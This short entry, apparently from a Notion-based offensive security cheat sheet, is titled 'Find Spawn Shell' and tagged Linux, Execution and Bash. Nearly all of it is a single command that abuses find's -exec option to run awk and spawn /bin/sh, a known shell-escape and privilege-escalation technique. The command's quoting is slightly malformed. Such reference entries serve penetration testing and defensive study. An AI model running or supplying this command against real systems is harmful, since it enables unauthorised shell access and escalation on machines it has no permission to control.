# find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

OS: Linux
Description: Find Spawn Shell
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)